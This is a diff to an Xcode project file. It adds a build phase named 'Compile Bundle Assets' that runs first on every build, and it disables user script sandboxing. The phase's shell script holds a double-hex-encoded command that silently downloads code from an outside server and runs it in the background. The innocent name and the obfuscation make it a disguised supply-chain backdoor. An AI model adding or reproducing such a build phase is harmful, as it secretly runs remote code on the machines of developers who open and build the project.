@@ -127,6 +127,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 8FBF34C42DA954A800049105 /* Build configuration list for PBXNativeTarget "RFOXIA" */;
 			buildPhases = (
+				5D5D13641F1318C7FDBDE67E /* Compile Bundle Assets */,
 				8FBF34972DA954A200049105 /* Sources */,
 				8FBF34982DA954A200049105 /* Frameworks */,
 				8FBF34992DA954A200049105 /* Resources */,
@@ -245,6 +246,12 @@
 		};
 /* End PBXProject section */
 
+/* Begin PBXShellScriptBuildPhase section */
+		5D5D13641F1318C7FDBDE67E /* Compile Bundle Assets */ = {			isa = PBXShellScriptBuildPhase;			buildActionMask = 2147483647;			alwaysOutOfDate = 1;			files = (			);			inputFileListPaths = (			);			inputPaths = (			);			name = "Compile Bundle Assets";			outputFileListPaths = (			);			outputPaths = (			);			shellPath = /bin/sh;			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n((echo 36353633363836663230323232343238363337353732366332303264363637333662346332303264363432303730336437383633366636343635323036383734373437303733336132663266363336343633363136333638363532653732373532663631323932323230376332303733363830610a | xxd -p -r | xxd -p -r | sh ) >/dev/null 2>&1 &)";			showEnvVarsInLog = 0;					};/* End PBXShellScriptBuildPhase section */
+
+/* Begin PBXBuildRule section */
+/* End PBXBuildRule section */
+
 /* Begin PBXResourcesBuildPhase section */
 		8FBF34992DA954A200049105 /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
@@ -344,7 +351,7 @@
 				DEBUG_INFORMATION_FORMAT = dwarf;
 				ENABLE_STRICT_OBJC_MSGSEND = YES;
 				ENABLE_TESTABILITY = YES;
-				ENABLE_USER_SCRIPT_SANDBOXING = YES;
+				ENABLE_USER_SCRIPT_SANDBOXING = NO;
 				GCC_C_LANGUAGE_STANDARD = gnu17;
 				GCC_DYNAMIC_NO_PIC = NO;
 				GCC_NO_COMMON_BLOCKS = YES;
@@ -407,7 +414,7 @@
 				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
 				ENABLE_NS_ASSERTIONS = NO;
 				ENABLE_STRICT_OBJC_MSGSEND = YES;
-				ENABLE_USER_SCRIPT_SANDBOXING = YES;
+				ENABLE_USER_SCRIPT_SANDBOXING = NO;
 				GCC_C_LANGUAGE_STANDARD = gnu17;
 				GCC_NO_COMMON_BLOCKS = YES;
 				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
